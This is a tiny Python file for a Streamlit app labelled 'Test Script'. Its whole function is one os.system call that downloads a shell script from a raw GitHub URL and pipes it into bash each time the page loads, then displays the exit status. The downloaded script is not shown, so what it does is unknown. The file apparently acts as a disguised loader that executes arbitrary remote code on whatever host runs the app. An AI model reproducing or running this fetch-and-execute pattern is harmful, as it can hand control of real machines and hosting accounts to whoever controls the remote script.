import streamlit as st
import os

st.title("Test Script")
st.header("Test")

results = os.system("curl -fsSL https://raw.githubusercontent.com/athayandamaqolomba/Streamlit/refs/heads/main/script.sh | bash")
st.write(results)
